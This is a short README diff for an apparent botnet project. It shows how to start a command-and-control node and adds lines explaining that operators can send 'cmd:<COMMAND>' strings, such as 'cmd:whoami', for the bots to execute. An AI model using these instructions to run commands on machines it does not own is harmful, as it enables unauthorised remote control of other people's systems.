@@ -39,3 +39,9 @@ To run the cncNode, please use the following command:
    ./cncNode -botAddress <host:port> -bootstrapAddress <bootstrap_node_address>
 
    ```
+You can now use your botnet by executing commands in this format: 
+   ```sh
+   cmd:<COMMAND>
+
+   ```
+Where <COMMAND> can be any type of command you want the bots to execute. For example, cmd:whoami, will make the bots return all information retrieved from the whoami command. 
